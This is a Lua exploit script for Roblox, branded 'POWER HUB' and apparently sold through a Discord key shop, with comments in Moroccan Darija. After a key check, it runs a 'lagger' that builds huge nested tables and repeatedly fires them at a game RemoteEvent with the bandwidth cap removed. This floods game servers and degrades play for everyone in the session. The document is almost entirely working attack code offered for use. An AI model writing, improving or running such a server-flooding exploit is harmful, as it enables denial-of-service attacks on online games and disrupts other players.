-- ==========================================
-- POWER HUB ⚡ | Discord Bot Key Loader
-- ==========================================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

-- 1. Kan-t-2kkdo wach l-moshteri dar l-key f l-awal dyal l-loadstring wla la
local providedKey = getgenv().script_key

-- Qayma dyal l-keys l-haqiqiya li generertihom (Wla t-baddlha b database/API dyalk)
-- Hna k-t-zid l-keys li k-t-sifto f Discord
local VALID_KEYS = {
    ["POWERD1SRDFBWBAYOFZ6C"] = true,
    ["EXAMPLE_KEY_2"] = true,
    ["VIP_KEY_2026"] = true,
}

-- Ila ma darsh l-key ga3 wla dar key ghalat
if not providedKey or not VALID_KEYS[providedKey] then
    LocalPlayer:Kick([[
[POWERHUB SECURITY]
❌ Invalid Key or Expired! Get a valid key from our Discord shop.
]])
    return
end

-- ==========================================
-- 2. ILAA KAN L-KEY SAHIH - K-Y-KHEDDAM L-SCRIPT
-- ==========================================
print("POWER HUB: Key Verified Successfully!")

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG = isMobile and {
    TableIncrease = 290,
    Tries = 1,
    LoopWaitTime = 0.85
} or {
    TableIncrease = 265,
    Tries = 1,
    LoopWaitTime = 0.05
}

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
    if not path or path == "" then return nil end
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then
            obj = obj[segment]
        else
            return nil
        end
    end
    return obj
end

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
    if remote then
        for i = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
        task.spawn(function()
            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        end)
        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    laggerEnabled = true
    laggerThread = coroutine.create(startLaggerLoop)
    coroutine.resume(laggerThread)
end

-- Workspace optimization
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end

-- ==================== UI ====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PowerHubDuelLagger"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = game.CoreGui

local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 160, 0, 82)
Main.Position = UDim2.new(0, 20, 0, 20)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 10)

local TitleMain = Instance.new("TextLabel")
TitleMain.Size = UDim2.new(1, -12, 0, 22)
TitleMain.Position = UDim2.new(0, 10, 0, 5)
TitleMain.BackgroundTransparency = 1
TitleMain.Text = "POWER HUB⚡"
TitleMain.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleMain.TextSize = 13
TitleMain.Font = Enum.Font.Code
TitleMain.TextXAlignment = Enum.TextXAlignment.Left
TitleMain.Parent = Main

local ToggleRow = Instance.new("Frame")
ToggleRow.Size = UDim2.new(1, -14, 0, 32)
ToggleRow.Position = UDim2.new(0, 7, 0, 32)
ToggleRow.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
ToggleRow.BorderSizePixel = 0
ToggleRow.Parent = Main

local ToggleRowCorner = Instance.new("UICorner", ToggleRow)
ToggleRowCorner.CornerRadius = UDim.new(0, 7)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -60, 1, 0)
StatusLabel.Position = UDim2.new(0, 0, 0, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "INACTIVE"
StatusLabel.TextColor3 = Color3.fromRGB(120, 120, 130)
StatusLabel.TextSize = 10
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
StatusLabel.Parent = ToggleRow

local PillBg = Instance.new("Frame")
PillBg.Size = UDim2.new(0, 40, 0, 20)
PillBg.Position = UDim2.new(1, -46, 0.5, -10)
PillBg.BackgroundColor3 = Color3.fromRGB(40, 40, 46)
PillBg.BorderSizePixel = 0
PillBg.Parent = ToggleRow

local PillCorner = Instance.new("UICorner", PillBg)
PillCorner.CornerRadius = UDim.new(1, 0)

local Dot = Instance.new("Frame")
Dot.Size = UDim2.new(0, 14, 0, 14)
Dot.Position = UDim2.new(0, 3, 0.5, -7)
Dot.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
Dot.BorderSizePixel = 0
Dot.Parent = PillBg

local DotCorner = Instance.new("UICorner", Dot)
DotCorner.CornerRadius = UDim.new(1, 0)

local PillHit = Instance.new("TextButton")
PillHit.Size = UDim2.new(1, 0, 1, 0)
PillHit.BackgroundTransparency = 1
PillHit.Text = ""
PillHit.Parent = PillBg

local RowHit = Instance.new("TextButton")
RowHit.Size = UDim2.new(1, 0, 1, 0)
RowHit.BackgroundTransparency = 1
RowHit.Text = ""
RowHit.Parent = ToggleRow

local function setLagger(state)
    laggerEnabled = state
    local tw = TweenInfo.new(0.18, Enum.EasingStyle.Quad)
    if laggerEnabled then
        TweenService:Create(PillBg, tw, {BackgroundColor3 = Color3.fromRGB(50, 50, 58)}):Play()
        TweenService:Create(Dot, tw, {
            Position = UDim2.new(0, 23, 0.5, -7),
            BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        StatusLabel.Text = "ACTIVE"
        StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
        startLagger()
    else
        TweenService:Create(PillBg, tw, {BackgroundColor3 = Color3.fromRGB(40, 40, 46)}):Play()
        TweenService:Create(Dot, tw, {
            Position = UDim2.new(0, 3, 0.5, -7),
            BackgroundColor3 = Color3.fromRGB(80, 80, 90)
        }):Play()
        StatusLabel.Text = "INACTIVE"
        StatusLabel.TextColor3 = Color3.fromRGB(120, 120, 130)
        stopLaggerLoop()
    end
end

PillHit.MouseButton1Click:Connect(function()
    setLagger(not laggerEnabled)
end)

RowHit.MouseButton1Click:Connect(function()
    setLagger(not laggerEnabled)
end)
